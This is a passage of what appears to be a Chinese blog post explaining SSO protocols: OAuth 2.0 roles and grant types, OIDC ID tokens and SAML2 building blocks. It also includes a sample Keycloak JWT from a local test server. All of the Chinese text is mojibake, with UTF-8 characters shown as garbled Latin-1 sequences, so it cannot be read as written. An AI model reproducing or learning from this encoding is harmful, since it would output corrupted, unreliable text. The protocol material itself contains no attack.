<li>ç¬¬ä¸‰æ–¹åº”ç”¨éœ€è¦å­˜å‚¨èµ„æºæ‰€æœ‰è€…çš„è®¿é—®å‡­æ®ï¼Œå…¸å‹çš„æ–¹æ¡ˆå°±æ˜¯ç”¨æˆ·åå¯†ç ï¼Œè¿™ç§æ–¹æ¡ˆæ˜¾ç„¶æ˜¯å±é™©çš„ï¼Œèµ„æºæ‰€æœ‰è€…ä¸å®Œå…¨å¯ä»¥ç¡®è®¤ç¬¬ä¸‰æ–¹åº”ç”¨åœ°å¯ä¿¡æ€§ï¼›</li>
<li>å—é™èµ„æºé€šè¿‡å¯†ç è®¿é—®ï¼Œä½†å¯†ç ä½“ç³»æœ¬èº«å­˜åœ¨å„ç§å„æ ·çš„å®‰å…¨é—®é¢˜ï¼Œå¦‚ï¼šæ³„éœ²ã€å¼ºåº¦é—®é¢˜ç­‰ï¼›</li>
<li>ç¬¬ä¸‰æ–¹åº”ç”¨é€šè¿‡å¯†ç è·å–åˆ°çš„è®¿é—®æƒé™å¤ªè¿‡å¹¿æ³›ï¼Œèµ„æºæ‰€æœ‰è€…å¹¶æ²¡æœ‰å¾ˆå¥½çš„åŠæ³•å¯¹è¿™ä¸ªèŒƒå›´è¿›è¡Œé™åˆ¶ï¼Œè¿™å¾€å¾€éœ€è¦é…åˆå…¶ä»–çš„æƒé™æ§åˆ¶æ–¹æ¡ˆè¿›è¡Œå®ç°ï¼Œå¦‚ï¼šRBACï¼ŒABACç­‰ï¼›</li>
<li>èµ„æºæ‰€æœ‰è€…ä¸èƒ½å¾ˆå¥½åœ°å¯¹ç¬¬ä¸‰æ–¹åº”ç”¨å¯¹å—é™èµ„æºå¾—è®¿é—®è¿›è¡Œæ§åˆ¶ï¼Œå¦‚ï¼šæ’¤é”€æƒé™ï¼Œå˜æ›´æƒé™ç­‰æ“ä½œï¼Œè¦åšåˆ°è¿™äº›å¾€å¾€éœ€è¦é€šè¿‡ä¿®æ”¹å¯†ç ä»¥åŠå˜æ›´è§’è‰²æƒé™çš„æ–¹å¼æ¥å®ç°ã€‚</li>
</ul>
<p>æ­£å› ä¸ºä¼ ç»Ÿçš„å¯†ç ä½“ç³»å¯¹å—é™èµ„æºçš„è®¿é—®æ§åˆ¶åœ¨åº”ç”¨åˆ°ç¬¬ä¸‰æ–¹åº”ç”¨çš„è¿‡ç¨‹ä¸­å­˜åœ¨çš„è¿™äº›ç¼ºé™·ä½¿ç„¶ï¼ŒäºŸéœ€ä¸€ç§çµæ´»ã€ä¾¿æ·ã€æœ‰æ•ˆã€å®‰å…¨çš„ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®å—é™èµ„æºçš„è§£å†³æ–¹æ¡ˆã€‚å¦‚OAuthï¼ŒCASï¼ŒOIDCï¼ŒSAMLç­‰åè®®æ¡†æ¶æ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œè¯ç”Ÿã€‚</p>
<p>æ•´ä½“æ¥è®²ï¼Œè¿™äº›æ¡†æ¶çš„åŸºæœ¬åŸç†æ˜¯ä¸€è‡´çš„ï¼ŒåŒºåˆ«åœ¨äºå®ƒä»¬å¦‚ä½•çœ‹å¾…è®¤è¯ä¸æˆæƒè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„å„ç§å¯¹è±¡ä»¥åŠå¦‚ä½•æè¿°ä»–ä»¬ä¹‹é—´çš„å…³ç³»å†è¾…ä»¥ä¸åŒçš„æ•°æ®ä¼ è¾“ä¸å¤„ç†æ–¹æ¡ˆï¼Œæ¯”å¦‚ï¼šOIDCä¾¿åŸºæœ¬ä¸Šå°±æ˜¯æ˜¯åŸºäºOAuth 2.0åŸºç¡€ä¸Šå®ç°çš„ä¸€ä¸ªæ¡†æ¶ï¼ŒSAMLä¸OAuth 2.0çš„éšå¼æ¨¡å¼åœ¨è¡¨ç°ä¸Šæœ€å¤§çš„å·®åˆ«ä¹Ÿå°±åœ¨æ•°æ®ç»“æ„ä¸Šé¢ï¼ŒCASä¸OAuth 2.0çš„éšå¼æ¨¡å¼ä¹Ÿå¾ˆç›¸ä¼¼ï¼Œè‡³å°‘å±•éœ²ç»™ç”¨æˆ·çš„éƒ¨åˆ†æ˜¯æå…¶ç›¸ä¼¼çš„ï¼ŒåŒºåˆ«åœ¨äºCASèƒ½å¤Ÿå¤„ç†ç”¨æˆ·è®¤è¯ä¸æˆæƒï¼ŒOAuth 2.0åªè´Ÿè´£å¤„ç†æˆæƒä¸”åœ¨CASä¸­ç¬¬ä¸‰æ–¹åº”ç”¨æºå¸¦ticketå»è¯·æ±‚èµ„æºæ—¶ä¼šæ ¹æ®ç”¨æˆ·è¿›è¡Œæƒé™æ ¡éªŒï¼Œè€ŒOAuth 2.0çš„æƒé™æˆäºˆåœ¨ç”³è¯·Access Tokenæ—¶ä¾¿å·²ç»å®Œæˆäº†ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°†ä»¥OAuth 2.0æˆæƒæ¡†æ¶ä¸ºä¸»ä½“å¯¹å¸¸è§çš„SSOè§£å†³æ–¹æ¡ˆè¿›è¡Œä¸€ä¸ªè®¤è¯†ã€‚</p>
<span id="more"></span>



<h1 id="å¸¸è§SSOåè®®"><a href="#å¸¸è§SSOåè®®" class="headerlink" title="å¸¸è§SSOåè®®"></a>å¸¸è§SSOåè®®</h1><h2 id="OAuth-2-0"><a href="#OAuth-2-0" class="headerlink" title="OAuth 2.0"></a>OAuth 2.0</h2><p>Oauth 2.0æˆæƒæ¡†æ¶å…è®¸ç¬¬ä¸‰æ–¹çš„åº”ç”¨ç¨‹åºé€šè¿‡ä¸èµ„æºæ‰€æœ‰è€…è¿›è¡Œäº¤äº’æˆ–è€…ä»¥è‡ªèº«çš„åä¹‰æ¥ä»¥HTTPçš„æ–¹å¼æ¥è·å–å—é™èµ„æºçš„éƒ¨åˆ†è®¿é—®æƒé™ã€‚è¯¥æ¡†æ¶æ˜¯åœ¨OAuth 1.0çš„åŸºç¡€ä¸Šå‘å±•èµ·æ¥çš„ï¼Œå…¶æ˜¯OAuth 1.0çš„æ›¿æ¢ä»¥åŠå‘å±•ï¼Œè€Œåœ¨æ¡†æ¶è¯¦ç»†è§„èŒƒä¸ŠOAuth 2.0ä¸OAuth 1.0åˆ™å¤§ç›¸å¾„åº­ï¼Œä¸¤è€…ä¸èƒ½äº’ç›¸å…¼å®¹ã€‚OAuth 2.0æ˜¯ä¸€ä¸ªæˆæƒåè®®ï¼Œä¸ç”¨æˆ·è®¤è¯ç›¸å…³çš„éƒ¨åˆ†å¹¶ä¸åœ¨è¯¥æ¡†æ¶çš„è®¨è®ºèŒƒå›´ç±»ï¼Œä½†ä¸€èˆ¬æ¥è¯´è®¤è¯ä¸æˆæƒæ˜¯ä¸åˆ†å®¶çš„ï¼Œè®¤è¯æ˜¯æˆæƒçš„åŸºçŸ³ï¼Œå³ä¾¿æ˜¯OAuth 2.0æ¡†æ¶ä¹Ÿæ˜¯åœ¨Clientsè·å¾—äº†èµ„æºæ‰€æœ‰è€…èº«ä»½è®¤è¯ä¹‹åæ‰èƒ½è¿›è¡Œè¿›ä¸€æ­¥çš„æˆæƒï¼Œè¿™æ­£æ˜¯OAuth 2.0æ‰€è®¨è®ºçš„ã€‚</p>
<p>åœ¨OAuth2.0æ¡†æ¶ä¸­ç»„åˆè¦æ¶‰åŠåˆ°4ä¸ªä¸»ä½“ï¼Œå³ï¼šèµ„æºæ‰€æœ‰è€…ã€èµ„æºæœåŠ¡æä¾›è€…ã€å®¢æˆ·ç«¯ä»¥åŠæˆæƒæœåŠ¡ã€‚å…¶ä¸­èµ„æºæ‰€æœ‰è€…äº«æœ‰å¯¹èµ„æºæœåŠ¡æä¾›è€…æä¾›çš„èµ„æºçš„å®Œå…¨æ§åˆ¶æƒåŠ›ï¼Œèµ„æºæœåŠ¡æä¾›è€…è´Ÿè´£æä¾›å—ä¿æŠ¤çš„èµ„æºå¹¶å“åº”é€šè¿‡Access Tokenå‘èµ·çš„å—ä¿æŠ¤èµ„æºè¯·æ±‚ï¼Œå®¢æˆ·ç«¯æ˜¯èµ„æºæ‰€æœ‰è€…çš„ä»£ç†å…¶å¹¶ä¸è¡¨ç¤ºä»»ä¸€å…·ä½“çš„å®ç°ï¼ˆåº”ç”¨ç¨‹åºï¼‰ä¹ƒæ˜¯ä¸€ç§æŠ½è±¡çš„æ¦‚å¿µï¼ŒæˆæƒæœåŠ¡è´Ÿè´£å‘ç»è¿‡è®¤è¯çš„å®¢æˆ·ç«¯ä¸‹å‘Access Tokenã€‚</p>
<h3 id="æˆæƒæ–¹æ¡ˆ"><a href="#æˆæƒæ–¹æ¡ˆ" class="headerlink" title="æˆæƒæ–¹æ¡ˆ"></a>æˆæƒæ–¹æ¡ˆ</h3><p>ä¸€ä¸ªé€šç”¨çš„OAuth 2.0åè®®å¤„ç†æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="/archives/ad6b67bf/image-20240103112709252.png" alt="image-20240103112709252"></p>
<p>å…³äºä¸Šå›¾åšå¦‚ä¸‹è§£é‡Šï¼š</p>
<p>ï¼ˆAï¼‰å®¢æˆ·ç«¯å‘èµ„æºæ‰€æœ‰è€…è¯·æ±‚æˆæƒã€‚ä¸»è¦é€šè¿‡ä¸¤è€…æ–¹å¼ï¼Œä¸€ç§æ˜¯å®¢æˆ·ç«¯ï¼ˆç¬¬ä¸‰æ–¹åº”ç”¨ï¼‰ç›´æ¥å‘èµ„æºæ‰€æœ‰è€…è¯·æ±‚å‡­æ®ï¼Œå¦ä¸€ç§åˆ™æ˜¯é€šè¿‡æˆæƒæœåŠ¡ä½œä¸ºä¸­ä»‹è¯·æ±‚å‡­æ®ã€‚ç›´æ¥è¯·æ±‚å‡­æ®çš„æ–¹å¼å®¢æˆ·ç«¯ä¼šå­˜å‚¨èµ„æºæ‰€æœ‰è€…çš„æ˜æ–‡å‡­æ®ï¼Œå­˜åœ¨å®‰å…¨æ€§é£é™©ï¼Œä¸€èˆ¬åªåœ¨å®¢æˆ·ç«¯ç±»å‹ä¸ºConfidential ä»¥åŠè®¸å¯ç±»å‹ä¸ºå®¢æˆ·ç«¯æ—¶ä½¿ç”¨ï¼Œå®è·µä¸­å¸¸è§çš„å‡ä¸ºé€šè¿‡æˆæƒæœåŠ¡ä½œä¸ºä¸­ä»‹çš„æ–¹å¼è¯·æ±‚å‡­æ®ï¼›</p>
<p>ï¼ˆBï¼‰å®¢æˆ·ç«¯æ¥æ”¶æˆæƒè®¸å¯ï¼Œè¿™ä¸ªè®¸å¯è¡¨ç¤ºäº†èµ„æºæ‰€æœ‰è€…çš„æˆæƒã€‚åœ¨è§„èŒƒä¸­å…±è§„å®šäº†4ç§æ ‡å‡†çš„è®¸å¯ç±»å‹ä»¥åŠå…¶ä»–å¯è‡ªè¡Œå®šä¹‰çš„è®¸å¯æ–¹å¼ï¼›</p>
<p>ï¼ˆCï¼‰å®¢æˆ·ç«¯ä½¿ç”¨è·å¾—çš„æˆæƒè®¸å¯å‘æˆæƒæœåŠ¡è·å–Access Tokenï¼›</p>
<p>ï¼ˆDï¼‰æˆæƒæœåŠ¡åœ¨å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯å¹¶æ ¡éªŒäº†æˆæƒè®¸å¯çš„æ­£ç¡®æ€§åä¸‹å‘Access Tokenï¼›</p>
<p>ï¼ˆEï¼‰å®¢æˆ·ç«¯é€šè¿‡ä¸Šä¸€æ­¥è·å¾—çš„Access Tokenå‘èµ„æºæœåŠ¡æä¾›è€…è¯·æ±‚èµ„æºï¼›</p>
<p>ï¼ˆFï¼‰èµ„æºæœåŠ¡æä¾›è€…åœ¨å‘æˆæƒæœåŠ¡éªŒè¯Access Tokençš„æ­£ç¡®æ€§åå‘å®¢æˆ·ç«¯ä¸‹å‘èµ„æºï¼›</p>
<p>ä¸Šæ–‡ä¸­æåˆ°OAuth 2.0è§„èŒƒä¸­æä¾›äº†4ä¸­æ ‡å‡†çš„è®¸å¯ç±»å‹ï¼Œä¸‹é¢è¿›è¡Œä»‹ç»ï¼š</p>
<h4 id="æˆæƒç ç±»å‹"><a href="#æˆæƒç ç±»å‹" class="headerlink" title="æˆæƒç ç±»å‹"></a>æˆæƒç ç±»å‹</h4><p>æˆæƒç ç±»å‹çš„è®¸å¯æŒ‰ç…§å¦‚ä¸‹å›¾çš„æµç¨‹è¿›è¡Œèµ„æºçš„æˆæƒè®¿é—®ï¼š</p>
<p><img src="/archives/ad6b67bf/image-20240103144212336.png" alt="image-20240103144212336"></p>
<p>ï¼ˆAï¼‰å®¢æˆ·ç«¯é€šè¿‡èµ„æºæ‰€æœ‰è€…çš„ä»£ç†ï¼ˆå³ç”¨æˆ·æµè§ˆå™¨ï¼‰è¿›è¡Œé‡å®šå‘å°†è¯·æ±‚å‘é€åˆ°æˆæƒæœåŠ¡ç«¯ç‚¹ã€‚å®¢æˆ·ç«¯è¯·æ±‚åŒ…æ‹¬client_idï¼ˆæ ‡è¯†å®¢æˆ·ç«¯èº«ä»½ï¼‰ã€è¯·æ±‚åŸŸï¼ˆè¦ç”³è¯·å“ªäº›æƒé™ï¼‰ã€æœ¬åœ°çŠ¶æ€ï¼ˆéšæœºæ•°ï¼Œé˜²CSRFï¼‰ä»¥åŠä¸€ä¸ªå°†æˆåŠŸæˆæƒåçš„è¯·æ±‚é‡å®šå‘çš„ç›®æ ‡URIï¼›</p>
<p>ï¼ˆBï¼‰æˆæƒæœåŠ¡å¯¹èµ„æºæŒæœ‰è€…çš„èº«ä»½è¿›è¡Œè®¤è¯å¹¶ç¡®å®šèµ„æºæŒæœ‰è€…æ˜¯å¦åŒæ„ä¸‹å‘å®¢æˆ·ç«¯è¯·æ±‚çš„åŸŸï¼›</p>
<p>ï¼ˆCï¼‰åœ¨æˆæƒæˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒæˆæƒæœåŠ¡ä¼šå°†è¯·æ±‚é‡å®šå‘åˆ°Aè¿‡ç¨‹ä¸­æŒ‡å®šçš„é‡å®šå‘ç›®æ ‡URIä¸­ï¼Œè¯¥URIå°†æºå¸¦é¢å¤–çš„æˆæƒç ä»¥åŠä¸€äº›å…¶ä»–çš„çŠ¶æ€å‚æ•°ï¼›</p>
<p>ï¼ˆDï¼‰å®¢æˆ·ç«¯è¯·æ±‚æºå¸¦client_idã€client_secretä»¥åŠæˆæƒç ç­‰å‘æˆæƒæœåŠ¡ç”³è¯·ä¸€ä¸ªAccess Tokenï¼›</p>
<p>ï¼ˆEï¼‰æˆæƒæœåŠ¡åœ¨ç¡®è®¤äº†å®¢æˆ·ç«¯çš„åˆæ³•æ€§å¹¶æ ¡éªŒäº†æˆæƒç åå‘å‘å®¢æˆ·ç«¯ä¸‹å‘Access Token ä»¥åŠä¸€ä¸ªå¯é€‰çš„Refresh Tokenã€‚</p>
<h4 id="ç´§å‡‘-éšå¼è®¸å¯ç±»å‹"><a href="#ç´§å‡‘-éšå¼è®¸å¯ç±»å‹" class="headerlink" title="ç´§å‡‘&#x2F;éšå¼è®¸å¯ç±»å‹"></a>ç´§å‡‘&#x2F;éšå¼è®¸å¯ç±»å‹</h4><p>ç´§å‡‘&#x2F;éšå¼è®¸å¯ç±»å‹çš„è®¸å¯æŒ‰ç…§å¦‚ä¸‹å›¾çš„æµç¨‹è¿›è¡Œèµ„æºçš„æˆæƒè®¿é—®ï¼š</p>
<p><img src="/archives/ad6b67bf/image-20240103154140345.png" alt="image-20240103154140345"></p>
<p>ï¼ˆAï¼‰ï¼ˆBï¼‰åŒæˆæƒç ç±»å‹ï¼ˆAï¼‰(B)</p>
<p>ï¼ˆCï¼‰æˆæƒé€šè¿‡çš„æƒ…å†µä¸‹ï¼ŒæˆæƒæœåŠ¡å°†Access Token å¤¹å¸¦åœ¨redirection URI fragmentä¸­è¿›è¡Œè¿”å›</p>
<p>ï¼ˆDï¼‰ç”¨æˆ·ä»£ç†å‘Webæ‰˜ç®¡çš„å®¢æˆ·ç«¯èµ„æºå‘èµ·è¯·æ±‚</p>
<p>ï¼ˆEï¼‰è·å–åˆ°ä¸€ä¸ªå¸¦æœ‰åµŒå…¥æ—¶è„šæœ¬çš„htmlé¡µé¢ï¼Œè¯¥è„šæœ¬èƒ½å¤Ÿæå–åœ¨Cä¸­å¾—åˆ°çš„Access Tokenå¹¶ä¸å®Œæ•´çš„é‡å®šå‘URIè¿›è¡Œç»„åˆ</p>
<p>ï¼ˆFï¼‰ç”¨æˆ·ä»£ç†åˆ©ç”¨Eä¸­è¿”å›çš„è„šæœ¬å°†Access Tokenä¸é‡å®šå‘URIè¿›è¡Œç»„åˆ</p>
<p>ï¼ˆGï¼‰ç”¨æˆ·ä»£ç†å°†Access Tokenä¼ é€’ç»™å®¢æˆ·ç«¯</p>
<h4 id="èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®ç±»å‹"><a href="#èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®ç±»å‹" class="headerlink" title="èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®ç±»å‹"></a>èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®ç±»å‹</h4><p>èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®ç±»å‹çš„è®¸å¯æŒ‰ç…§å¦‚ä¸‹å›¾çš„æµç¨‹è¿›è¡Œèµ„æºçš„æˆæƒè®¿é—®ï¼š</p>
<p><img src="/archives/ad6b67bf/image-20240103155801548.png" alt="image-20240103155801548"></p>
<p>ï¼ˆAï¼‰èµ„æºæŒæœ‰è€…ç›´æ¥å‘å®¢æˆ·ç«¯æä¾›å…¶å¯†ç å‡­æ®</p>
<p>ï¼ˆBï¼‰å®¢æˆ·ç«¯é€šè¿‡è·å–åˆ°çš„å¯†ç å‡­æ®å‘æˆæƒæœåŠ¡è¯·æ±‚Access Token</p>
<p>ï¼ˆCï¼‰æˆæƒæœåŠ¡åœ¨éªŒè¯äº†å®¢æˆ·ç«¯åˆæ³•æ€§ä¸å‡­æ®åˆæ³•æ€§åå‘å®¢æˆ·ç«¯ä¸‹å‘Access Tokenä»¥åŠå¯é€‰çš„Refresh Token</p>
<h4 id="å®¢æˆ·ç«¯å‡­æ®è®¸å¯ç±»å‹"><a href="#å®¢æˆ·ç«¯å‡­æ®è®¸å¯ç±»å‹" class="headerlink" title="å®¢æˆ·ç«¯å‡­æ®è®¸å¯ç±»å‹"></a>å®¢æˆ·ç«¯å‡­æ®è®¸å¯ç±»å‹</h4><p>å®¢æˆ·ç«¯å‡­æ®è®¸å¯ç±»å‹çš„è®¸å¯æŒ‰ç…§å¦‚ä¸‹å›¾çš„æµç¨‹è¿›è¡Œèµ„æºçš„æˆæƒè®¿é—®ï¼š</p>
<p><img src="/archives/ad6b67bf/image-20240103161547699.png" alt="image-20240103161547699"></p>
<p>ï¼ˆAï¼‰å®¢æˆ·ç«¯å‘æˆæƒæœåŠ¡å‘é€è‡ªèº«çš„å‡­æ®</p>
<p>ï¼ˆBï¼‰æˆæƒæœåŠ¡éªŒè¯å®¢æˆ·ç«¯å‡­æ®çš„æœ‰æ•ˆæ€§å¹¶ä¸‹å‘Access Token</p>
<h2 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h2><p>OAuth 2.0åªè´Ÿè´£å¯¹èµ„æºçš„æˆæƒå¹¶ä¸è´Ÿè´£ç”¨æˆ·çš„è®¤è¯ï¼Œæ‰€ä»¥å•çº¯åœ°ä½¿ç”¨OAuth 2.0æˆæƒæ¡†æ¶æ˜¯ä¸èƒ½å®Œæˆç”¨æˆ·è®¤è¯çš„ï¼Œè€Œè®¤è¯åˆæ˜¯æˆæƒçš„åŸºçŸ³ï¼Œæ•…åœ¨ç”Ÿäº§ä¸­æˆ‘ä»¬å¾€å¾€ä¸ä¼šè§åˆ°å•ç‹¬ä½¿ç”¨çš„OAuth 2.0ï¼Œå…¶æ€»æ˜¯ä¸å…¶ä»–çš„è®¤è¯æ–¹æ¡ˆä¸€èµ·å‡ºç°çš„ã€‚ä¸€ç§è‰¯å¥½çš„æ—¢èƒ½å…¼é¡¾è®¤è¯åˆèƒ½å…¼é¡¾æˆæƒçš„è§£å†³æ–¹æ¡ˆä¸”åŸºäºOAuth 2.0çš„æ–°çš„è®¤è¯ä¸æˆæƒè§£å†³æ–¹æ¡ˆä¾¿æ˜¯OIDCã€‚</p>
<p>OIDCä¸OAuth 2.0æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºOIDCæ–°å¢äº†ID Tokenä½œä¸ºç”¨æˆ·çš„èº«ä»½å‡­æ®ã€‚å½“ç„¶OIDCä¹Ÿåœ¨OAuth 2.0çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ä¸€äº›ä¸°å¯Œï¼Œå¦‚ï¼šæœåŠ¡å‘ç°ç­‰ã€‚</p>
<p>åœ¨OIDCä¸­è®¤è¯ä¸æˆæƒè¿‡ç¨‹ä¸­çš„è§’è‰²æœ‰äº†æ–°çš„åå­—ï¼š</p>
<ul>
<li>æˆæƒæœåŠ¡å™¨ï¼ˆOP-OpenID Providerï¼‰</li>
<li>ç»ˆç«¯ç”¨æˆ·ï¼ˆEU-End Userï¼‰</li>
<li>å—ä¿¡å®¢æˆ·ç«¯ï¼ˆRP-Relying Partyï¼‰</li>
</ul>
<p>OIDCä¸­è²Œä¼¼å¿½ç•¥äº†OAuth 2.0çš„èµ„æºæä¾›è€…è¿™ä¸€è§’è‰²ï¼Œå…¶å®ä¸ç„¶ï¼Œåªæ˜¯è¢«åŒ…å«åœ¨äº†RPä¸­ã€‚</p>
<p>OIDCçš„æˆæƒæµç¨‹ä¸OAuth 2.0åŸºæœ¬ä¸€è‡´ï¼ŒåŒºåˆ«åœ¨äºè·å–Access Tokenæ˜¯ï¼ŒOIDCè¿è¡Œåœ¨æˆæƒç æ¨¡å¼ã€éšå¼æ¨¡å¼ä»¥åŠå¯†ç æ¨¡å¼æ—¶ä¼šåŒæ—¶è·å–åˆ°ID Tokenä»¥æ ‡è¯†ç”¨æˆ·èº«ä»½</p>
<p>ä¸‹é¢æ˜¯å¼€æºèº«ä»½è®¤è¯ä¸æˆæƒåº”ç”¨KeyCloakçš„ä¸€ä¸ªID TOKEN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIzYjk0Y2YzMS03ZDYwLTQyYjUtYjA4YS1iZDVlYmYwYTA3ODQifQ.eyJleHAiOjE3MDUwNjM4MzMsImlhdCI6MTcwNTAyNzgzMywianRpIjoiYzYzZGYxNjItMTI2Mi00Nzk3LTkyOGMtNTkyMWFkOGFmMDk4IiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJzdWIiOiJiYmUzMWE4NS1iNDk2LTQ3MWYtYTlkOS1hYjc5NjE4YjJhZjIiLCJ0eXAiOiJTZXJpYWxpemVkLUlEIiwic2Vzc2lvbl9zdGF0ZSI6IjNjYmNlOTAxLTZiODUtNDA4Ni04MWM4LThhZmUyZmQyM2FmNSIsInNpZCI6IjNjYmNlOTAxLTZiODUtNDA4Ni04MWM4LThhZmUyZmQyM2FmNSIsInN0YXRlX2NoZWNrZXIiOiIyYklaREE0OWV4d3RCRlFrNXg5SEZIWVBIaFpCZXNRcFNPOGo4UXNOMXBJIn0.GlF7wITRQqUonrtgOw26ewNFVGF8HdBUU1dd_MNmlQs</span><br></pre></td></tr></table></figure>

<p>è§£ç åä¸º</p>
<p><img src="/archives/ad6b67bf/image-20240112105835688.png" alt="image-20240112105835688"></p>
<p>åœ¨Payloadéƒ¨åˆ†å®šä¹‰äº†ä¸€äº›ä¸ç”¨æˆ·èº«ä»½ç›¸å…³çš„å­—æ®µï¼Œå¦‚ï¼šsubï¼Œè¯¥å­—æ®µæ ‡è¯†äº†ç»ˆç«¯ç”¨æˆ·çš„IDã€‚ç¬¬ä¸‰æ–¹åº”ç”¨åœ¨è·å–åˆ°è¯¥ID Tokenä¾¿å¯ä»¥ä½¿ç”¨è¯¥Tokenå‘<code>/userinfo</code>ç«¯ç‚¹è·å–ç”¨æˆ·èº«ä»½ä¿¡æ¯ã€‚</p>
<p>OIDCè§„èŒƒä¸­å®šä¹‰äº†ä¸€äº›æ ‡å‡†çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™äº›ç”¨æˆ·ä¿¡æ¯å¯ä»¥ç›´æ¥åŒ…å«åœ¨<code>ID Token</code>ä¸­ä¹Ÿå¯é€šè¿‡<code>userinfo</code>ç«¯ç‚¹è¿”å›ï¼Œå‚è€ƒï¼š<a href="https://openid.net/specs/openid-connect-core-1_0.html#/StandardClaims">Standard Claims</a></p>
<p><img src="/archives/ad6b67bf/image-20240112105450001.png" alt="image-20240112105450001"></p>
<h2 id="SAML2"><a href="#SAML2" class="headerlink" title="SAML2"></a>SAML2</h2><p>SAMLçš„å…¨ç§°ä¸ºå®‰å…¨æ–­è¨€æ ‡è®°è¯­è¨€ï¼ˆSecurity Assertion Markup Languageæ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼Œå…¶å…è®¸èº«ä»½æä¾›å•†ï¼ˆIDPï¼‰å°†æˆæƒå‡­è¯ä¼ é€’ç»™æœåŠ¡æä¾›å•†ï¼ˆSPï¼‰ï¼Œä½¿ç”¨å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆXMLï¼‰è¿›è¡ŒIDPå’ŒSPä¹‹é—´çš„æ ‡å‡†åŒ–é€šä¿¡ã€‚æ‰€è°“IDPï¼Œé¡¾åæ€ä¹‰å³æä¾›èº«ä»½è®¤è¯çš„æœåŠ¡å•†ï¼Œç­‰åŒäºOAuth 2.0ä¸­çš„æˆæƒæœåŠ¡ï¼ˆauthorization serverï¼‰ä»¥åŠOIDCä¸­çš„ï¼ˆOP-OpenID Providerï¼‰ï¼›SPç­‰åŒäºOAuth 2.0ä¸­çš„èµ„æºæœåŠ¡ï¼ˆresource serverï¼‰ä»¥åŠOIDCä¸­çš„å—ä¿¡å®¢æˆ·ç«¯ï¼ˆRP-Relying Partyï¼‰ã€‚SPä¸IDPé€šè¿‡æµè§ˆå™¨ä½¿ç”¨XMLæ ¼å¼æ•°æ®è¿›è¡Œä¿¡æ¯äº¤äº’ä»è€Œå®Œæˆè®¤è¯ä¸æˆæƒæ“ä½œï¼Œè¿™ä¸ªXMLæ ¼å¼çš„æ•°æ®å°±æ˜¯æ–­è¨€ã€‚</p>
<p>SAMLç”±ä¸€äº›æ„å»ºå—ç»„æˆï¼Œå½“è¿™äº›ç»„ä»¶é€šè¿‡ä¸åŒçš„æ–¹å¼ç»„åˆåœ¨ä¸€èµ·çš„æ—¶å€™å°±å¯ä»¥åœ¨ä¸åŒåœºæ™¯ä¸‹å®Œæˆå·²ç»äº’ç›¸ä¿¡ä»»çš„è‡ªæ²»ç³»ç»Ÿä¹‹é—´å¯¹ç”¨æˆ·èº«ä»½ã€å±æ€§ã€è®¤è¯ã€æˆæƒä¿¡æ¯çš„äº¤æ¢çš„éœ€æ±‚ï¼ŒSAMLè§„èŒƒçš„æ ¸å¿ƒä¾¿æ˜¯æè¿°ä¼ è¾“è¿™äº›ä¿¡æ¯çš„æ–­è¨€å’Œåè®®æ¶ˆæ¯çš„ç»“æ„ä¸å†…å®¹ã€‚</p>
<p>è¦å®Œæˆè¿™äº›ç›®æ ‡ï¼ŒSAMLä½“ç³»å®šä¹‰äº†ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œå¦‚ï¼šAssertionï¼ŒProtocolsï¼ŒBindingsï¼ŒProfilesï¼ŒMetadataï¼ŒAuthentication Contextï¼ŒSubject Confirmationã€‚</p>
<p><img src="/archives/ad6b67bf/sstc-saml-tech-overview-2.0-cd-02_html_73dc0b55.gif" alt="SAML concepts"></p>
<ul>
<li><strong>SAMLæ–­è¨€</strong>æºå¸¦å…³äºä¸»ä½“çš„å£°æ˜ï¼Œå£°æ˜æ–¹å£°ç§°è¯¥å£°æ˜ä¸ºçœŸï¼Œä¾èµ–æ–¹è§£æè¯¥æ–­è¨€éªŒè¯å…¶å®Œæ•´æ€§ä¸æœ‰æ•ˆæ€§ã€‚æ–­è¨€çš„æœ‰æ•ˆç»“æ„å’Œå†…å®¹ç”±SAMLæ–­è¨€çš„XML schemaå®šä¹‰ï¼›</li>
<li><strong>åè®®</strong> ç”¨äºç”³æ˜å½“å‰æ–­è¨€çš„ç±»å‹ï¼Œå¹¶ç»‘å®šäº†ä¸åŒçš„XMLç»“æ„ï¼Œè¯¥ç»“æ„ç”±XML schemaé™åˆ¶ï¼Œå¦‚ï¼šè®¤è¯è¯·æ±‚åè®®ï¼Œå•ç‚¹ç™»å‡ºåè®®ï¼Œæ–­è¨€æŸ¥è¯¢è¯·æ±‚åè®®ï¼ŒArtifact è§£æåè®®ï¼Œèº«ä»½æ ‡è¯†ç®¡ç†åè®®ï¼Œèº«ä»½æ ‡è¯†æ˜ å°„åè®®ç­‰ï¼›</li>
<li><strong>ç»‘å®š</strong> å®šä¹‰äº†SPä¸IDPæ˜¯å¦‚ä½•é€šè¿‡ä¸€äº›åŸºç¡€çš„åè®®ï¼ˆHTTP&#x2F;SOAPç­‰ï¼‰è¿›è¡Œäº¤äº’çš„ï¼Œå¦‚ï¼šHTTP é‡å®šå‘ç»‘å®šï¼ŒHTTP POSTç»‘å®šï¼ŒHTTP Artifactç»‘å®šï¼ŒSAML SOAPç»‘å®šï¼ŒSAML URIç»‘å®šç­‰ï¼›</li>
